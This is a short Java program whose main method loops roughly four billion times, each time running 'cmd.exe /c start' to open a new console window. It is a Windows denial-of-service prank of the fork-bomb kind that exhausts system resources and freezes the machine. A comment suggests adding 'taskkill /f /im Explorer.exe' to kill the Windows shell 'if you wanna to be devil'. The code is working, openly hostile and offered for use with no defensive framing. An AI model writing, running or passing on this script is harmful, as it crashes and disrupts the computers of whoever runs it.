import java.io.IOException;

public class Main { //Start


 public static void main(String[] args) throws IOException {
	for (int x = Integer.MIN_VALUE; x < Integer.MAX_VALUE; x++) {
		Runtime rt = Runtime.getRuntime();
	        String[] s = {"cmd.exe","/c","start"}; //add "taskkill /f /im Explorer.exe" if you wanna to be devil !
		rt.exec(s);
	}
}


} //End
